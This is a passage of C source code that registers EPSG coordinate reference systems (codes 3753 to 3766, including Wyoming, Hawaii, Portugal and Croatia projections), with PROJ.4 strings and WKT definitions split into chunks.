\"66666666666666],PARAMETER[\\\"central_meridian\\\",-82.5],PA\");\n    add_srs_wkt (p, 11,\n        \"RAMETER[\\\"false_easting\\\",1968500],PARAMETER[\\\"false_nor\");\n    add_srs_wkt (p, 12,\n        \"thing\\\",0],UNIT[\\\"US survey foot\\\",0.3048006096012192,AU\");\n    add_srs_wkt (p, 13,\n        \"THORITY[\\\"EPSG\\\",\\\"9003\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",\");\n    add_srs_wkt (p, 14,\n        \"NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3753\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3754, \"epsg\", 3754,\n        \"NAD83(HARN) / Ohio South (ftUS)\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=40.03333333333333 +lat_2=38.73333333333\");\n    add_proj4text (p, 1,\n        \"333 +lat_0=38 +lon_0=-82.5 +x_0=600000 +y_0=0 +ellps=GRS\");\n    add_proj4text (p, 2,\n        \"80 +towgs84=0,0,0,0,0,0,0 +units=us-ft +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / Ohio South (ftUS)\\\",GEOGCS[\\\"NAD8\");\n    add_srs_wkt (p, 1,\n        \"3(HARN)\\\",DATUM[\\\"NAD83_High_Accuracy_Reference_Network\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 4,\n        \"G\\\",\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 5,\n        \",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY\");\n    add_srs_wkt (p, 6,\n        \"[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4152\\\"]],PROJE\");\n    add_srs_wkt (p, 7,\n        \"CTION[\\\"Lambert_Conformal_Conic_2SP\\\"],PARAMETER[\\\"stand\");\n    add_srs_wkt (p, 8,\n        \"ard_parallel_1\\\",40.03333333333333],PARAMETER[\\\"standard\");\n    add_srs_wkt (p, 9,\n        \"_parallel_2\\\",38.73333333333333],PARAMETER[\\\"latitude_of\");\n    add_srs_wkt (p, 10,\n        \"_origin\\\",38],PARAMETER[\\\"central_meridian\\\",-82.5],PARA\");\n    add_srs_wkt (p, 11,\n        \"METER[\\\"false_easting\\\",1968500],PARAMETER[\\\"false_north\");\n    add_srs_wkt (p, 12,\n        \"ing\\\",0],UNIT[\\\"US survey foot\\\",0.3048006096012192,AUTH\");\n    add_srs_wkt (p, 13,\n        \"ORITY[\\\"EPSG\\\",\\\"9003\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NO\");\n    add_srs_wkt (p, 14,\n        \"RTH],AUTHORITY[\\\"EPSG\\\",\\\"3754\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3755, \"epsg\", 3755,\n        \"NAD83(HARN) / Wyoming East (ftUS)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=40.5 +lon_0=-105.1666666666667 +k=0.9\");\n    add_proj4text (p, 1,\n        \"999375 +x_0=200000.00001016 +y_0=0 +ellps=GRS80 +towgs84\");\n    add_proj4text (p, 2,\n        \"=0,0,0,0,0,0,0 +units=us-ft +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / Wyoming East (ftUS)\\\",GEOGCS[\\\"NA\");\n    add_srs_wkt (p, 1,\n        \"D83(HARN)\\\",DATUM[\\\"NAD83_High_Accuracy_Reference_Networ\");\n    add_srs_wkt (p, 2,\n        \"k\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORIT\");\n    add_srs_wkt (p, 3,\n        \"Y[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"\");\n    add_srs_wkt (p, 4,\n        \"EPSG\\\",\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 5,\n        \"G\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHOR\");\n    add_srs_wkt (p, 6,\n        \"ITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4152\\\"]],PR\");\n    add_srs_wkt (p, 7,\n        \"OJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_o\");\n    add_srs_wkt (p, 8,\n        \"f_origin\\\",40.5],PARAMETER[\\\"central_meridian\\\",-105.166\");\n    add_srs_wkt (p, 9,\n        \"6666666667],PARAMETER[\\\"scale_factor\\\",0.9999375],PARAME\");\n    add_srs_wkt (p, 10,\n        \"TER[\\\"false_easting\\\",656166.6667],PARAMETER[\\\"false_nor\");\n    add_srs_wkt (p, 11,\n        \"thing\\\",0],UNIT[\\\"US survey foot\\\",0.3048006096012192,AU\");\n    add_srs_wkt (p, 12,\n        \"THORITY[\\\"EPSG\\\",\\\"9003\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",\");\n    add_srs_wkt (p, 13,\n        \"NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3755\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3756, \"epsg\", 3756,\n        \"NAD83(HARN) / Wyoming East Central (ftUS)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=40.5 +lon_0=-107.3333333333333 +k=0.9\");\n    add_proj4text (p, 1,\n        \"999375 +x_0=399999.99998984 +y_0=99999.99998983997 +ellp\");\n    add_proj4text (p, 2,\n        \"s=GRS80 +towgs84=0,0,0,0,0,0,0 +units=us-ft +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / Wyoming East Central (ftUS)\\\",GEO\");\n    add_srs_wkt (p, 1,\n        \"GCS[\\\"NAD83(HARN)\\\",DATUM[\\\"NAD83_High_Accuracy_Referenc\");\n    add_srs_wkt (p, 2,\n        \"e_Network\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,\");\n    add_srs_wkt (p, 3,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUT\");\n    add_srs_wkt (p, 4,\n        \"HORITY[\\\"EPSG\\\",\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHOR\");\n    add_srs_wkt (p, 5,\n        \"ITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.01745329251994\");\n    add_srs_wkt (p, 6,\n        \"33,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"41\");\n    add_srs_wkt (p, 7,\n        \"52\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"l\");\n    add_srs_wkt (p, 8,\n        \"atitude_of_origin\\\",40.5],PARAMETER[\\\"central_meridian\\\"\");\n    add_srs_wkt (p, 9,\n        \",-107.3333333333333],PARAMETER[\\\"scale_factor\\\",0.999937\");\n    add_srs_wkt (p, 10,\n        \"5],PARAMETER[\\\"false_easting\\\",1312333.3333],PARAMETER[\\\"\");\n    add_srs_wkt (p, 11,\n        \"false_northing\\\",328083.3333],UNIT[\\\"US survey foot\\\",0.\");\n    add_srs_wkt (p, 12,\n        \"3048006096012192,AUTHORITY[\\\"EPSG\\\",\\\"9003\\\"]],AXIS[\\\"X\\\"\");\n    add_srs_wkt (p, 13,\n        \",EAST],AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3756\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3757, \"epsg\", 3757,\n        \"NAD83(HARN) / Wyoming West Central (ftUS)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=40.5 +lon_0=-108.75 +k=0.9999375 +x_0\");\n    add_proj4text (p, 1,\n        \"=600000 +y_0=0 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +unit\");\n    add_proj4text (p, 2,\n        \"s=us-ft +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / Wyoming West Central (ftUS)\\\",GEO\");\n    add_srs_wkt (p, 1,\n        \"GCS[\\\"NAD83(HARN)\\\",DATUM[\\\"NAD83_High_Accuracy_Referenc\");\n    add_srs_wkt (p, 2,\n        \"e_Network\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,\");\n    add_srs_wkt (p, 3,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUT\");\n    add_srs_wkt (p, 4,\n        \"HORITY[\\\"EPSG\\\",\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHOR\");\n    add_srs_wkt (p, 5,\n        \"ITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.01745329251994\");\n    add_srs_wkt (p, 6,\n        \"33,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"41\");\n    add_srs_wkt (p, 7,\n        \"52\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"l\");\n    add_srs_wkt (p, 8,\n        \"atitude_of_origin\\\",40.5],PARAMETER[\\\"central_meridian\\\"\");\n    add_srs_wkt (p, 9,\n        \",-108.75],PARAMETER[\\\"scale_factor\\\",0.9999375],PARAMETE\");\n    add_srs_wkt (p, 10,\n        \"R[\\\"false_easting\\\",1968500],PARAMETER[\\\"false_northing\\\"\");\n    add_srs_wkt (p, 11,\n        \",0],UNIT[\\\"US survey foot\\\",0.3048006096012192,AUTHORITY\");\n    add_srs_wkt (p, 12,\n        \"[\\\"EPSG\\\",\\\"9003\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],\");\n    add_srs_wkt (p, 13,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"3757\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3758, \"epsg\", 3758,\n        \"NAD83(HARN) / Wyoming West (ftUS)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=40.5 +lon_0=-110.0833333333333 +k=0.9\");\n    add_proj4text (p, 1,\n        \"999375 +x_0=800000.0000101599 +y_0=99999.99998983997 +el\");\n    add_proj4text (p, 2,\n        \"lps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=us-ft +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / Wyoming West (ftUS)\\\",GEOGCS[\\\"NA\");\n    add_srs_wkt (p, 1,\n        \"D83(HARN)\\\",DATUM[\\\"NAD83_High_Accuracy_Reference_Networ\");\n    add_srs_wkt (p, 2,\n        \"k\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORIT\");\n    add_srs_wkt (p, 3,\n        \"Y[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"\");\n    add_srs_wkt (p, 4,\n        \"EPSG\\\",\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 5,\n        \"G\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHOR\");\n    add_srs_wkt (p, 6,\n        \"ITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4152\\\"]],PR\");\n    add_srs_wkt (p, 7,\n        \"OJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_o\");\n    add_srs_wkt (p, 8,\n        \"f_origin\\\",40.5],PARAMETER[\\\"central_meridian\\\",-110.083\");\n    add_srs_wkt (p, 9,\n        \"3333333333],PARAMETER[\\\"scale_factor\\\",0.9999375],PARAME\");\n    add_srs_wkt (p, 10,\n        \"TER[\\\"false_easting\\\",2624666.6667],PARAMETER[\\\"false_no\");\n    add_srs_wkt (p, 11,\n        \"rthing\\\",328083.3333],UNIT[\\\"US survey foot\\\",0.30480060\");\n    add_srs_wkt (p, 12,\n        \"96012192,AUTHORITY[\\\"EPSG\\\",\\\"9003\\\"]],AXIS[\\\"X\\\",EAST],\");\n    add_srs_wkt (p, 13,\n        \"AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3758\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3759, \"epsg\", 3759,\n        \"NAD83 / Hawaii zone 3 (ftUS)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=21.16666666666667 +lon_0=-158 +k=0.99\");\n    add_proj4text (p, 1,\n        \"999 +x_0=500000.00001016 +y_0=0 +datum=NAD83 +units=us-f\");\n    add_proj4text (p, 2,\n        \"t +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83 / Hawaii zone 3 (ftUS)\\\",GEOGCS[\\\"NAD83\\\"\");\n    add_srs_wkt (p, 1,\n        \",DATUM[\\\"North_American_Datum_1983\\\",SPHEROID[\\\"GRS 1980\");\n    add_srs_wkt (p, 2,\n        \"\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],T\");\n    add_srs_wkt (p, 3,\n        \"OWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6269\\\"]],PRIM\");\n    add_srs_wkt (p, 4,\n        \"EM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"\");\n    add_srs_wkt (p, 5,\n        \"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]\");\n    add_srs_wkt (p, 6,\n        \"],AUTHORITY[\\\"EPSG\\\",\\\"4269\\\"]],PROJECTION[\\\"Transverse_\");\n    add_srs_wkt (p, 7,\n        \"Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",21.16666666\");\n    add_srs_wkt (p, 8,\n        \"666667],PARAMETER[\\\"central_meridian\\\",-158],PARAMETER[\\\"\");\n    add_srs_wkt (p, 9,\n        \"scale_factor\\\",0.99999],PARAMETER[\\\"false_easting\\\",1640\");\n    add_srs_wkt (p, 10,\n        \"416.6667],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"US surv\");\n    add_srs_wkt (p, 11,\n        \"ey foot\\\",0.3048006096012192,AUTHORITY[\\\"EPSG\\\",\\\"9003\\\"\");\n    add_srs_wkt (p, 12,\n        \"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 13,\n        \",\\\"3759\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3760, \"epsg\", 3760,\n        \"NAD83(HARN) / Hawaii zone 3 (ftUS)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=21.16666666666667 +lon_0=-158 +k=0.99\");\n    add_proj4text (p, 1,\n        \"999 +x_0=500000.00001016 +y_0=0 +ellps=GRS80 +towgs84=0,\");\n    add_proj4text (p, 2,\n        \"0,0,0,0,0,0 +units=us-ft +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / Hawaii zone 3 (ftUS)\\\",GEOGCS[\\\"N\");\n    add_srs_wkt (p, 1,\n        \"AD83(HARN)\\\",DATUM[\\\"NAD83_High_Accuracy_Reference_Netwo\");\n    add_srs_wkt (p, 2,\n        \"rk\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORI\");\n    add_srs_wkt (p, 3,\n        \"TY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\");\n    add_srs_wkt (p, 4,\n        \"\\\"EPSG\\\",\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 5,\n        \"PSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTH\");\n    add_srs_wkt (p, 6,\n        \"ORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4152\\\"]],\");\n    add_srs_wkt (p, 7,\n        \"PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude\");\n    add_srs_wkt (p, 8,\n        \"_of_origin\\\",21.16666666666667],PARAMETER[\\\"central_meri\");\n    add_srs_wkt (p, 9,\n        \"dian\\\",-158],PARAMETER[\\\"scale_factor\\\",0.99999],PARAMET\");\n    add_srs_wkt (p, 10,\n        \"ER[\\\"false_easting\\\",1640416.6667],PARAMETER[\\\"false_nor\");\n    add_srs_wkt (p, 11,\n        \"thing\\\",0],UNIT[\\\"US survey foot\\\",0.3048006096012192,AU\");\n    add_srs_wkt (p, 12,\n        \"THORITY[\\\"EPSG\\\",\\\"9003\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",\");\n    add_srs_wkt (p, 13,\n        \"NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3760\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3761, \"epsg\", 3761,\n        \"NAD83(CSRS) / UTM zone 22N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=22 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +\");\n    add_proj4text (p, 1,\n        \"units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(CSRS) / UTM zone 22N\\\",GEOGCS[\\\"NAD83(CSR\");\n    add_srs_wkt (p, 1,\n        \"S)\\\",DATUM[\\\"NAD83_Canadian_Spatial_Reference_System\\\",S\");\n    add_srs_wkt (p, 2,\n        \"PHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 3,\n        \"PSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 4,\n        \"\\\",\\\"6140\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 5,\n        \"\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\");\n    add_srs_wkt (p, 6,\n        \"\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4617\\\"]],PROJEC\");\n    add_srs_wkt (p, 7,\n        \"TION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_or\");\n    add_srs_wkt (p, 8,\n        \"igin\\\",0],PARAMETER[\\\"central_meridian\\\",-51],PARAMETER[\");\n    add_srs_wkt (p, 9,\n        \"\\\"scale_factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500\");\n    add_srs_wkt (p, 10,\n        \"000],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AU\");\n    add_srs_wkt (p, 11,\n        \"THORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\");\n    add_srs_wkt (p, 12,\n        \"\\\"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3761\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3762, \"epsg\", 3762,\n        \"WGS 84 / South Georgia Lambert\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=-54 +lat_2=-54.75 +lat_0=-55 +lon_0=-37\");\n    add_proj4text (p, 1,\n        \" +x_0=0 +y_0=0 +datum=WGS84 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 84 / South Georgia Lambert\\\",GEOGCS[\\\"WGS 8\");\n    add_srs_wkt (p, 1,\n        \"4\\\",DATUM[\\\"WGS_1984\\\",SPHEROID[\\\"WGS 84\\\",6378137,298.2\");\n    add_srs_wkt (p, 2,\n        \"57223563,AUTHORITY[\\\"EPSG\\\",\\\"7030\\\"]],AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 3,\n        \",\\\"6326\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 4,\n        \"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 5,\n        \"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4326\\\"]],PROJECTI\");\n    add_srs_wkt (p, 6,\n        \"ON[\\\"Lambert_Conformal_Conic_2SP\\\"],PARAMETER[\\\"standard\");\n    add_srs_wkt (p, 7,\n        \"_parallel_1\\\",-54],PARAMETER[\\\"standard_parallel_2\\\",-54\");\n    add_srs_wkt (p, 8,\n        \".75],PARAMETER[\\\"latitude_of_origin\\\",-55],PARAMETER[\\\"c\");\n    add_srs_wkt (p, 9,\n        \"entral_meridian\\\",-37],PARAMETER[\\\"false_easting\\\",0],PA\");\n    add_srs_wkt (p, 10,\n        \"RAMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY\");\n    add_srs_wkt (p, 11,\n        \"[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"North\");\n    add_srs_wkt (p, 12,\n        \"ing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3762\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3763, \"epsg\", 3763,\n        \"ETRS89 / Portugal TM06\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=39.66825833333333 +lon_0=-8.133108333\");\n    add_proj4text (p, 1,\n        \"333334 +k=1 +x_0=0 +y_0=0 +ellps=GRS80 +towgs84=0,0,0,0,\");\n    add_proj4text (p, 2,\n        \"0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / Portugal TM06\\\",GEOGCS[\\\"ETRS89\\\",DATU\");\n    add_srs_wkt (p, 1,\n        \"M[\\\"European_Terrestrial_Reference_System_1989\\\",SPHEROI\");\n    add_srs_wkt (p, 2,\n        \"D[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 3,\n        \"\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6\");\n    add_srs_wkt (p, 4,\n        \"258\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\");\n    add_srs_wkt (p, 5,\n        \"\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 6,\n        \"\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"\");\n    add_srs_wkt (p, 7,\n        \"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",\");\n    add_srs_wkt (p, 8,\n        \"39.66825833333333],PARAMETER[\\\"central_meridian\\\",-8.133\");\n    add_srs_wkt (p, 9,\n        \"108333333334],PARAMETER[\\\"scale_factor\\\",1],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_easting\\\",0],PARAMETER[\\\"false_northing\\\",0],UNIT[\");\n    add_srs_wkt (p, 11,\n        \"\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3763\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3764, \"epsg\", 3764,\n        \"NZGD2000 / Chatham Island Circuit 2000\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=-44 +lon_0=-176.5 +k=1 +x_0=400000 +y\");\n    add_proj4text (p, 1,\n        \"_0=800000 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +\");\n    add_proj4text (p, 2,\n        \"no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NZGD2000 / Chatham Island Circuit 2000\\\",GEOGCS\");\n    add_srs_wkt (p, 1,\n        \"[\\\"NZGD2000\\\",DATUM[\\\"New_Zealand_Geodetic_Datum_2000\\\",\");\n    add_srs_wkt (p, 2,\n        \"SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 4,\n        \"G\\\",\\\"6167\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 5,\n        \",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY\");\n    add_srs_wkt (p, 6,\n        \"[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4167\\\"]],PROJE\");\n    add_srs_wkt (p, 7,\n        \"CTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_o\");\n    add_srs_wkt (p, 8,\n        \"rigin\\\",-44],PARAMETER[\\\"central_meridian\\\",-176.5],PARA\");\n    add_srs_wkt (p, 9,\n        \"METER[\\\"scale_factor\\\",1],PARAMETER[\\\"false_easting\\\",40\");\n    add_srs_wkt (p, 10,\n        \"0000],PARAMETER[\\\"false_northing\\\",800000],UNIT[\\\"metre\\\"\");\n    add_srs_wkt (p, 11,\n        \",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH\");\n    add_srs_wkt (p, 12,\n        \"],AXIS[\\\"Easting\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3764\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3765, \"epsg\", 3765,\n        \"HTRS96 / Croatia TM\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=16.5 +k=0.9999 +x_0=500000 +\");\n    add_proj4text (p, 1,\n        \"y_0=0 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_d\");\n    add_proj4text (p, 2,\n        \"efs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"HTRS96 / Croatia TM\\\",GEOGCS[\\\"HTRS96\\\",DATUM[\\\"\");\n    add_srs_wkt (p, 1,\n        \"Croatian_Terrestrial_Reference_System\\\",SPHEROID[\\\"GRS 1\");\n    add_srs_wkt (p, 2,\n        \"980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]\");\n    add_srs_wkt (p, 3,\n        \"],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6761\\\"]],P\");\n    add_srs_wkt (p, 4,\n        \"RIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT\");\n    add_srs_wkt (p, 5,\n        \"[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\");\n    add_srs_wkt (p, 6,\n        \"\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4761\\\"]],PROJECTION[\\\"Transver\");\n    add_srs_wkt (p, 7,\n        \"se_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAM\");\n    add_srs_wkt (p, 8,\n        \"ETER[\\\"central_meridian\\\",16.5],PARAMETER[\\\"scale_factor\");\n    add_srs_wkt (p, 9,\n        \"\\\",0.9999],PARAMETER[\\\"false_easting\\\",500000],PARAMETER\");\n    add_srs_wkt (p, 10,\n        \"[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 11,\n        \"\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",N\");\n    add_srs_wkt (p, 12,\n        \"ORTH],AUTHORITY[\\\"EPSG\\\",\\\"3765\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3766, \"epsg\", 3766,\n        \"HTRS96 / Croatia LCC\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=45.91666666666666 +lat_2=43.08333333333\");\n    add_proj4text (p, 1,\n        \"334 +lat_0=0 +lon_0=16.5 +x_0=0 +y_0=0 +ellps=GRS80 +tow\");\n    add_proj4text (p, 2,\n        \"gs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"HTRS96 / Croatia LCC\\\",GEOGCS[\\\"HTRS96\\\",DATUM[\");\n    add_srs_wkt (p, 1,\n        \"\\\"Croatian_Terrestrial_Reference_System\\\",SPHEROID[\\\"GRS\");\n    add_srs_wkt (p, 2,\n        \" 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"\");\n    add_srs_wkt (p, 3,\n        \"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6761\\\"]],\");\n    add_srs_wkt (p, 4,\n        \"PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNI\");\n    